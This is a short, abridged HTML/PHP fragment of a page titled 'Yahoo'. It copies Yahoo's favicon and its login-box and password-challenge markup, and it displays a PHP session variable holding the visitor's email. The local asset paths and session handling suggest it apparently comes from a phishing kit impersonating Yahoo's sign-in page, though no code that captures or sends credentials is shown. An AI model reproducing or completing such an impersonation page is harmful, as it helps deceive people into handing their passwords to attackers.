...
<html id="Stencil" class="js grid light-theme">
    <head>
        ...
        <link rel="shortcut icon" href="./img/Yahoo/yahoo.ico" type="image/x-icon">
        <title>Yahoo</title>
        <style>
                ...
                <div class="login-box right">
                    ...
                    <div class="challenge password-challenge">
                        <div class="challenge-header">
                            <div class="yid"><?php echo $_SESSION['email2']; ?></div>
                        </div>
